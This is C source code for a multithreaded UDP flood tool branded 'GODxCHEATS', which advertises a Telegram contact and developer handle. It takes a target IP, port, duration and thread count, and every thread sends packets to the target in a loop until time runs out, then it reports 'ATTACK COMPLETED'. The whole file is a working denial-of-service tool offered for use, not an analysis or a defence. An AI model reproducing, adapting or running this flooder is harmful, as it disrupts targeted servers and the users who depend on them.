#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define EXPIRY_DATE "2025-3-20"

struct thread_data {
    char *ip;
    int port;
    int time;
    unsigned long *total_packets_sent; // Pointer to total packets sent
    unsigned long *total_bytes_sent;   // Pointer to total bytes sent
};

// Function to print the banner
void print_banner() {
    printf("\033[1;33m╔════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;33m║ \033[1;37m★ \033[1;32mGODxCHEATS \033[1;37m★ \033[1;33m║\033[0m\n");
    printf("\033[1;33m╠════════════════════════════════════════════════════════════════════════════════════════════════╣\033[0m\n");
    printf("\033[1;33m║ \033[1;36m✦ DEVELOPED BY: \033[1;32m@GODxAloneBOY \033[1;33m║\033[0m\n");
    printf("\033[1;33m║ \033[1;31m✦ [ https://t.me/+03wLVBPurPk2NWRl ] \033[1;33m║\033[0m\n");
    printf("\033[1;33m║ \033[1;36m✦ CONTACT: \033[1;32m@GODxAloneBOY \033[1;33m║\033[0m\n");
    printf("\033[1;33m╠════════════════════════════════════════════════════════════════════════════════════════════════╣\033[0m\n");
    printf("\033[1;33m║ \033[1;37m★ \033[1;32m🍆🍆🍆🍆🍆🍆🍆🍆🍆 \033[1;37m★ \033[1;33m║\033[0m\n");
    printf("\033[1;33m╚════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m\n");
}

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    unsigned long packets_sent = 0;
    unsigned long bytes_sent = 0;
    
    // Payload ko proper string se define kiya gaya
    char *payloads[] = { "Flood attack" };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
            packets_sent++;
            bytes_sent += strlen(payloads[i]);
        }
    }

    close(sock);

    // Update global counters
    *(data->total_packets_sent) += packets_sent;
    *(data->total_bytes_sent) += bytes_sent;

    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    // Print the banner
    print_banner();

    // Check if proper arguments are provided
    if (argc != 5) {
        printf("\033[0;31mUsage: ./Alone <IP> <PORT> <TIME> <DURATION>\n\033[0m");
        exit(1);
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    unsigned long total_packets_sent = 0;
    unsigned long total_bytes_sent = 0;

    printf("\033[1;35mFLOOD STARTED ON %s:%d FOR %d SECONDS WITH %d THREADS\n\033[0m", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));
        data->ip = ip;
        data->port = port;
        data->time = time;
        data->total_packets_sent = &total_packets_sent;
        data->total_bytes_sent = &total_bytes_sent;

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
            perror("Thread creation failed");
            free(data);
            free(thread_ids);
            exit(1);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);

   printf("\n\033[1;37m╔════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;37m║ \033[1;32mATTACK COMPLETED.\033[0m \033[1;37m║\033[0m\n");
    printf("\033[1;37m║ \033[1;34mTOTAL PACKETS SENT: \033[1;35m%lu \033[0m \033[1;37m║\033[0m\n", total_packets_sent);
    printf("\033[1;37m║ \033[1;34mTOTAL DATA SENT: \033[1;35m%.2f MB \033[0m \033[1;37m║\033[0m\n", (double)total_bytes_sent / (1024 * 1024));
    printf("\033[1;37m║ \033[1;36mATTACK FINISHED BY @GODxAloneBOY \033[0m \033[1;37m║\033[0m\n");
    printf("\033[1;37m╚════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m\n");

    return 0;
}
